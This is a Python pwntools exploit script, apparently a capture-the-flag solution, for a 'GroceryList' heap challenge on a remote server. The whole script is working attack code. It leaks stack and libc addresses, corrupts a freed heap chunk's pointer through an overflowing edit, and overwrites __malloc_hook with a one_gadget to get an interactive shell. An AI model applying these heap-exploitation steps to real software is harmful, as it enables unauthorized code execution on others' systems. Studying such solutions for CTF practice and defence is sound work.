#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
import os
import sys

elfPath = "./GroceryList"
libcPath = "./libc.so.6"
remoteAddr = "chal.noxale.com"
remotePort = 1232

context.binary = elfPath
elf = context.binary
if sys.argv[1] == "l":
    io = process(elfPath)
    libc = elf.libc

else:
    if sys.argv[1] == "d":
        io = process(elfPath, env = {"LD_PRELOAD": libcPath})
    else:
        io = remote(remoteAddr, remotePort)
    if libcPath:
        libc = ELF(libcPath)

context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
success = lambda name, value: log.success("{} -> {:#x}".format(name, value))

def DEBUG():
    base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
    success("item_list", base + 0x202040)
    success("cnt", base + 0x2020E0)
    success("free", base + 0xE99)
    success("printf", base + 0x114A)
    success("gets", base + 0xFFA)
    success("malloc", base + 0xBA5)
    success("empty malloc", base + 0xD7E)
    success("clean", base + 0x10B0)
    raw_input("DEBUG: ")

def show():
    io.sendlineafter("Exit\n", "1")

def add(size, name):
    io.sendlineafter("Exit\n", "2")
    io.sendlineafter("Large\n", str(size))
    io.sendlineafter("name: \n", name)

def add_empty(size, num):
    io.sendlineafter("Exit\n", "3")
    io.sendlineafter("Large\n", str(size))
    io.sendlineafter("add?\n", str(num))

def delete(idx):
    io.sendlineafter("Exit\n", "4")
    io.sendlineafter("remove?\n", str(idx))

def edit(idx, name):
    io.sendlineafter("Exit\n", "5")
    io.sendlineafter("edit?\n", str(idx))
    io.sendlineafter("name: \n", name)

def add_default():
    io.sendlineafter("Exit\n", "6")

def exit():
    io.sendlineafter("Exit\n", "7")

if __name__ == "__main__":
    add_default() # 0
    show()
    stack = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\0')) - 0x3b
    success("stack", stack)

    add_default() # 1
    delete(1)
    edit(0, '0' * 0x18 + p64(0x21) + p64(stack + 0x20))
    add_default() 
    
    add_empty(1, 1)
    show()
    io.recvuntil("2. ")
    #  __libc_start_main = u64(io.recvn(6) + '\0\0') - 240
    #  success("__libc_start_main", __libc_start_main)
    libc.address = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\00')) - 240 - libc.sym['__libc_start_main']
    success("libc", libc.address)

    add_empty(3, 2)
    delete(4)
    edit(3, '0' * 0x60 + p64(0) + p64(0x71) + p64(libc.sym['__malloc_hook'] - 0x23))
    add(3, 'cccc')
    #  DEBUG()
    one_gadget = 0x4526a
    add(3, '0' * 11 + p64(one_gadget+ libc.address) + p64(libc.sym['__libc_realloc'] + 16))
    add_empty(1, 1)

    io.interactive()
